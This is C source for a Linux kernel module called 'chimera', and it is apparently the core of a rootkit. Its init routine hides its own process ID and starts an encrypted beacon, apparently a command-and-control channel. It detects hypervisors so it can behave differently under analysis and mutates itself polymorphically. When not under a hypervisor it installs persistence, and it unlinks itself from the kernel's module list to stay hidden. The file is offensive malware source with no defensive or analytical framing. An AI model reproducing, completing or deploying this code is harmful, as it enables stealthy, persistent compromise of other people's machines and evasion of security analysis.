#include "chimera.h"

struct chimera_state g_state;

static int __init chimera_init(void)
{
    int ret;

    memset(&g_state, 0, sizeof(g_state));
    mutex_init(&g_state.beacon_lock);

    rk_hide_pid(current->pid);

    get_random_bytes(g_state.session_key, AES_KEY_SIZE);
    get_random_bytes(g_state.aes_iv, AES_BLOCK_SIZE);
    ret = aes256_init(g_state.session_key, g_state.aes_iv);
    if (ret) {
        pr_err("chimera: crypto init failed\n");
        return ret;
    }

    rk_hv_detect(&g_state.hv);
    if (g_state.hv.detected) {
        pr_info("chimera: hypervisor detected (%s), paranoid mode\n",
                g_state.hv.vendor[0] ? g_state.hv.vendor : "unknown");
    }

    ret = rk_mem_guard_init();
    if (ret)
        pr_warn("chimera: mem guard init failed (%d)\n", ret);

    ret = rk_init_hooks();
    if (ret)
        pr_warn("chimera: hook init failed (%d)\n", ret);

    rk_polymorph_mutate(&g_state.poly);

    ret = rk_beacon_start();
    if (ret) {
        pr_err("chimera: beacon start failed (%d)\n", ret);
        goto cleanup;
    }

    if (!g_state.hv.detected) {
        ret = rk_persist_install();
        if (ret)
            pr_warn("chimera: persistence partial (%d)\n", ret);
    }

    list_del_init(&THIS_MODULE->list);

    return 0;

cleanup:
    rk_cleanup_hooks();
    rk_mem_guard_cleanup();
    rk_crypto_cleanup();
    return ret;
}

static void __exit chimera_exit(void)
{
    rk_beacon_stop();
    rk_cleanup_hooks();
    rk_mem_guard_cleanup();
    rk_crypto_cleanup();

    memset(&g_state, 0, sizeof(g_state));
}

module_init(chimera_init);
module_exit(chimera_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR(" ");
MODULE_DESCRIPTION(" ");
MODULE_VERSION("");
